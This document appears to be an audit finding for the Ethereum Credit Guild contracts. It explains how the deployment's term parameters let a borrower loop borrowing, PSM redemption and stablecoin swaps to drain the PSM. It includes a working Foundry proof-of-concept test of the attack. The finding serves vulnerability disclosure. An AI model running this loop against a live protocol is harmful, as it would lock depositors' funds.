# Lines of code

https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/src/loan/SimplePSM.sol#L80-L84


# Vulnerability details

## Bug Description
In the ECG, borrowers are users who supply a `collateral` token and mint `Credit` via the term when taking out loans. Lenders are users who deposit a specified `pegToken` into the `SimplePSM` contract and receive minted `Credit`. It is expected that borrowers will use their borrowed `Credit` to then redeem the `pegToken` from the PSM. It follows that the ECG expects borrowers' primary objective, after they borrow, to be to redeem `pegToken`s since this token will be a commonly used token that the borrower can then use any where in DeFi. However, this design potentially allows a malicious user to use their own capital to grief the system by creating multiple loans at little to no cost (malicious user only pays gas fees), and end up with their original capital. 

In order for the above to occur (with little to no loss to the exploiter) the term would have to have specific parameters. It just so happens that those specific parameters are the same as the term parameters that are in the `GIP_0.sol` deployment script for the protocol:

```
collateralToken: sDAI
maxDebtPerCollateralToken: 1e18
maxDelayBetweenPartialRepay: 0
minPartialRepayPercent: 0
pegToken: USDC
```

The above paremeters allow for a user to obtain `~$1000` worth of sDAI (`1000e18`) and take out a loan for `1000e18 Credit`. The borrower would then be able to redeem `~$1000` worth of USDC (`1000e18`) via the the PSM by burning their `1000 Credit`. This seems to be the intended functionality of the protocol, but this design can be abused. Consider the following scenario below:

`5_000e18` USDC is deposited into the PSM and thus `SimplePSM::redeemableCredit() == 5_000e18`:

[SimplePSM::redeemableCredit#L95-L99](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/src/loan/SimplePSM.sol#L95-L99)

```solidity
97:    function redeemableCredit() public view returns (uint256) {
98:        return getMintAmountOut(pegTokenBalance);
99:    }
```

The above function calculates the maximum amount of `Credit` that can be redeemed from the PSM. *Note: With no bad debt accrued, 1 Credit == 1 USDC*. The `pegTokenBalance` is incremented when people deposit USDC into the PSM and mint `Credit` via `SimplePSM::mint` and it is decremented when people redeem USDC and burn `Credit` via `SimplePSM::redeem`. The `getMintAmountOut` function illustrates the exchange rate for USDC/Credit:


[SimplePSM::getMintAmountOut#L80-L84](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/src/loan/SimplePSM.sol#L80-L84)
```solidity
    function getMintAmountOut(uint256 amountIn) public view returns (uint256) {
        uint256 creditMultiplier = ProfitManager(profitManager)
            .creditMultiplier();
        return (amountIn * decimalCorrection * 1e18) / creditMultiplier;
    }
```

The above shows that the amount of `Credit` that can be redeemed for `USDC` is determined by the `creditMultiplier`. For now we will assume that the `creditMultiplier` has not been updated, i.e. no bad debt has been accrued. Therefore, we are able to use `1_000e18 Credit` to redeem the `1_000e18` USDC. Consider the following state:

```
- redeemableCredit(): 5_000e18
- term issuance: 0 
- # of loans created: 0
- attacker capital: $1000 sDAI (1_000e18)
```

Based on the above an attacker can do the following:

1. use $1000 worth of sDAI (`1000e18`) to create a loan for `1000e18 Credit`
2. use borrowed credit to redeem `1000e18 USDC` via the PSM
3. swap the USDC for `1000e18 sDAI` on the open market (both are stable coins)
4. repeat steps 1-3 until all of the funds from the PSM are drained. 

The result of the above actions are as follows: 

```
- redeemableCredit(): 0
- term issuance: 5_000 
- # of loans created: 5
- attacker capital: $1000 sDAI (1_000e18)
```

It is important to note that although the above actions are possible, they can not all be done in a single block by one address. This is due to how the `loanId` for a borrower's loan is computed:

[LendingTerm::_borrow#L347-L352](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/src/loan/LendingTerm.sol#L347-L352)

```solidity
347:        loanId = keccak256(
348:            abi.encode(borrower, address(this), block.timestamp)
349:        );
350:
351:        // check that the loan doesn't already exist
352:        require(loans[loanId].borrowTime == 0, "LendingTerm: loan exists");
```

As we can see above, a borrower's `loanId` only has one dynamic value: `block.timestamp`. Therefore, if a borrower tries to create two loans in the same block the check on line 352 will cause the borrower's second transaction to fail. Therefore, an attacker will either have to perform the exploit highlighted above in multiple blocks or they can use multiple different addresses and submit the transactions in a single block, forwarding the funds to each new address as loans are created. 

## Impact
For terms using similar parameters as in the deployment script, an attacker is able use all of the funds in the PSM to create an arbitrary amount of loans. The attacker will end up with the same dollar value of capital that they started with and will only be subject to gas fees and slippage. Therefore, they will have no incentive to pay back the loans. 

This will result in the PSM being drained and an inflated `issuance` for the term, which can only decrease if the loans are either forgiven via Governance (this results in the `borrow amount` being recorded as a loss to the system and the collateral, i.e value from the PSM, will be locked in the term until another Governanace action extracts the value), or if the term is off-boarded via Governance and then the loans are called. In both cases the value from the PSM will be locked in the term until further Governance action is taken.

Secondary effects of this would be that borrowers may be disincentivized to borrow on the term until new funds enter the PSM. This is under the assumption that the borrowers' primary objective is to use their borrowed `Credit` to redeem `USDC`. Additionally, new users may also be disincentivized to deposit `USDC` into the PSM since that `USDC` can be easily locked in the term by a dishonest borrower. 

## Proof of Concept

The test below showcases the scenario outlined above in which an attacker uses the funds in the PSM to grief the protocol by creating multiple loans that they will then sit on, resulting in the PSM being drained. 

Place the test inside of the `test/unit/loan/` directory:

```solidity
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.8.13;

import {Clones} from "@openzeppelin/contracts/proxy/Clones.sol";

import {Test} from "@forge-std/Test.sol";
import {Core} from "@src/core/Core.sol";
import {CoreRoles} from "@src/core/CoreRoles.sol";
import {MockERC20} from "@test/mock/MockERC20.sol";
import {SimplePSM} from "@src/loan/SimplePSM.sol";
import {GuildToken} from "@src/tokens/GuildToken.sol";
import {CreditToken} from "@src/tokens/CreditToken.sol";
import {LendingTerm} from "@src/loan/LendingTerm.sol";
import {AuctionHouse} from "@src/loan/AuctionHouse.sol";
import {ProfitManager} from "@src/governance/ProfitManager.sol";
import {RateLimitedMinter} from "@src/rate-limits/RateLimitedMinter.sol";

contract CreateLoansViaPSMFunds is Test {
    address private governor = address(1);
    address private guardian = address(2);
    address staker = address(0x01010101);
    address lender = address(0x02020202);
    address borrower = address(0x03030303);
    Core private core;
    ProfitManager private profitManager;
    CreditToken credit;
    GuildToken guild;
    MockERC20 collateral;
    MockERC20 pegToken;
    SimplePSM private psm;
    RateLimitedMinter rlcm;
    AuctionHouse auctionHouse;
    LendingTerm term;

    // LendingTerm params (same as deployment script)
    uint256 constant _CREDIT_PER_COLLATERAL_TOKEN = 1e18; // 1:1
    uint256 constant _INTEREST_RATE = 0.04e18; // 4% APR
    uint256 constant _MAX_DELAY_BETWEEN_PARTIAL_REPAY = 0; 
    uint256 constant _MIN_PARTIAL_REPAY_PERCENT = 0; 
    uint256 constant _HARDCAP = 2_000_000e18; // 2 million

    uint256 public issuance = 0;

    function setUp() public {
        vm.warp(1679067867);
        vm.roll(16848497);
        core = new Core();

        profitManager = new ProfitManager(address(core));
        collateral = new MockERC20();
        pegToken = new MockERC20(); // 18 decimals for easy calculations (deployment script uses USDC which has 6 decimals)
        credit = new CreditToken(address(core), "name", "symbol");
        guild = new GuildToken(
            address(core),
            address(profitManager)
        );
        rlcm = new RateLimitedMinter(
            address(core) /*_core*/,
            address(credit) /*_token*/,
            CoreRoles.RATE_LIMITED_CREDIT_MINTER /*_role*/,
            0 /*_maxRateLimitPerSecond*/,
            0 /*_rateLimitPerSecond*/,
            uint128(_HARDCAP) /*_bufferCap*/
        );
        auctionHouse = new AuctionHouse(address(core), 650, 1800);
        term = LendingTerm(Clones.clone(address(new LendingTerm())));
        term.initialize(
            address(core),
            LendingTerm.LendingTermReferences({
                profitManager: address(profitManager),
                guildToken: address(guild),
                auctionHouse: address(auctionHouse),
                creditMinter: address(rlcm),
                creditToken: address(credit)
            }),
            LendingTerm.LendingTermParams({
                collateralToken: address(collateral),
                maxDebtPerCollateralToken: _CREDIT_PER_COLLATERAL_TOKEN,
                interestRate: _INTEREST_RATE,
                maxDelayBetweenPartialRepay: _MAX_DELAY_BETWEEN_PARTIAL_REPAY,
                minPartialRepayPercent: _MIN_PARTIAL_REPAY_PERCENT,
                openingFee: 0,
                hardCap: _HARDCAP
            })
        );
        psm = new SimplePSM(
            address(core),
            address(profitManager),
            address(credit),
            address(pegToken)
        );
        profitManager.initializeReferences(address(credit), address(guild), address(psm));

        // roles
        core.grantRole(CoreRoles.GOVERNOR, governor);
        core.grantRole(CoreRoles.GUARDIAN, guardian);
        core.grantRole(CoreRoles.CREDIT_MINTER, address(this));
        core.grantRole(CoreRoles.GUILD_MINTER, address(this));
        core.grantRole(CoreRoles.GAUGE_ADD, address(this));
        core.grantRole(CoreRoles.GAUGE_PARAMETERS, address(this));
        core.grantRole(CoreRoles.CREDIT_MINTER, address(rlcm));
        core.grantRole(CoreRoles.RATE_LIMITED_CREDIT_MINTER, address(term));
        core.grantRole(CoreRoles.CREDIT_MINTER, address(psm));
        core.renounceRole(CoreRoles.GOVERNOR, address(this));

        // add gauge 
        guild.setMaxGauges(10);
        guild.addGauge(1, address(term));
    }

    function testCreateLoansAndDrainPSM() public {
        // gauge is staked into (has debtCeiling)
        guild.mint(staker, 100e18);
        vm.startPrank(staker);
        guild.incrementGauge(address(term), 100e18);
        vm.stopPrank();

        // psm has 5_000 pegToken from lender (any other users)
        pegToken.mint(lender, 5_000e18);
        vm.startPrank(lender);
        pegToken.approve(address(psm), 5_000e18);
        psm.mint(lender, 5_000e18);
        vm.stopPrank();

        // borrower does the following across 5 blocks:
        // 1. uses collateral to borrow credit
        // 2. uses credit to redeem pegToken
        // 3. swaps pegToken for collateral (assuming both stable coins) on open market
        // 4. repeats above steps until the psm is drained
        // Note that borrower can use multiple accounts to perform these actions in one block

        uint256 collateralAmount = 1_000e18;
        uint256 borrowAmount = collateralAmount;
        collateral.mint(borrower, borrowAmount);

        vm.startPrank(borrower);
        collateral.approve(address(term), type(uint256).max);
        credit.approve(address(psm), type(uint256).max);
        vm.stopPrank();

        for (uint i; i < 5; i++) {
            vm.startPrank(borrower);
            term.borrow(borrowAmount, collateralAmount);
            psm.redeem(borrower, collateralAmount);
            swap(collateralAmount);
            vm.stopPrank();

            vm.roll(block.number + 1);
            vm.warp(block.timestamp + 13);
        }

        // verify end state
        assertEq(collateral.balanceOf(borrower), 1_000e18); // borrow has same collateral they started with (no incentive to payback loans)
        assertEq(pegToken.balanceOf(address(psm)), 0); // psm was drained
        assertEq(psm.redeemableCredit(), 0); // psm drained
        assertEq(collateral.balanceOf(address(term)), 5_000e18); // term has 5_000 collateral that came from psm funds
        assertEq(term.issuance(), 5_000e18); // 5 loans created for 1_000 credit each
    }

    function swap(uint256 amount) internal {
        // simulate a swap on the open market for stable coins
        // burn pegToken from borrower
        pegToken.burn(amount);

        // mint collateral token for borrower
        collateral.mint(borrower, amount);
    }
}
```

